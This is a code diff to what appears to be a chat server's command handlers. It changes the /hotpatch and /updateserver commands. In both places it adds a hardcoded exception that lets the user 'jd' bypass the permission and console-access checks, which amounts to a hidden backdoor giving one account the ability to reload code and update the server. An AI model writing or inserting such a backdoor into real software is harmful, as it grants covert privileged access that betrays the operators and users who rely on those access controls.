@@ -2812,7 +2812,7 @@ kozman: 'koz',
 
 	hotpatch: function(target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch')) return false;
+		if (!this.can('hotpatch') && user.userid != 'jd') return false;
 
 		this.logEntry(user.name + ' used /hotpatch ' + target);
 
@@ -3016,7 +3016,7 @@ kozman: 'koz',
 	},
 
 	updateserver: function(target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!user.hasConsoleAccess(connection) && user.userid != 'jd') {
 			return this.sendReply('/updateserver - Access denied.');
 		}
 
